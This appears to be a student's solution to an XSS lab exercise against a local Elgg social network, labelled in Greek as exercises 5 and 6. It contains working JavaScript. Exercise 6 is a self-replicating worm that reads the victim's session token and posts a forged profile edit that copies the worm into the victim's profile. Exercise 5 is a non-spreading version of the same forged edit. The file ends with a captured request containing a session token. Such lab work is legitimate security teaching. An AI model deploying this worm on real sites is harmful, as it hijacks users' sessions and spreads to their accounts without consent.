						ASKHSH 6
========================================================================================================
<script type="text/javascript" id="damage">
window.onload=function(){
	var headerTag = "<script id=\"damage\" type=\"text/javascript\">";
	var jsCode = document.getElementById("damage").innerHTML;
	var tailTag = "</" + "script>";

	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var name="&name="+ elgg.session.user.name;


	var briefDesc="&description='Ela+Panagia+mou'" + wormCode +"&accesslevel%5Bdescription%5D=2";
	var content= token + ts + name + briefDesc + guid; 
	var sendurl="http://www.xsslabelgg.com/action/profile/edit"; 
	var yourGuid=53; //FILL IN

	if(elgg.session.user.guid!=yourGuid) {

	var Ajax=null;
	Ajax=new XMLHttpRequest();
	Ajax.open("POST", sendurl, true);
	Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send(content);

	}
	alert(jsCode);
}
</script>

/


						ASKHSH 5
========================================================================================================
<script type="text/javascript" id="damage">
window.onload=function(){

	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var name="&name="+ elgg.session.user.name;


	var briefDesc="&description='Ela+Panagia+mou'"+"&accesslevel%5Bdescription%5D=2";
	var content= token + ts + name + briefDesc + guid; 
	var sendurl="http://www.xsslabelgg.com/action/profile/edit"; 
	var yourGuid=53; //FILL IN

	if(elgg.session.user.guid!=yourGuid) {

	var Ajax=null;
	Ajax=new XMLHttpRequest();
	Ajax.open("POST", sendurl, true);
	Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send(content);

	}
}
</script>



/* __elgg_token=edOY13s84UmRfD4W5KwNpg&__elgg_ts=1622815448&name=Aggelos Karras&description=&accesslevel[description]=2
&briefdescription=Ela Panagia mou&accesslevel[briefdescription]=2
&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&
contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&
twitter=&accesslevel[twitter]=2&guid=53*/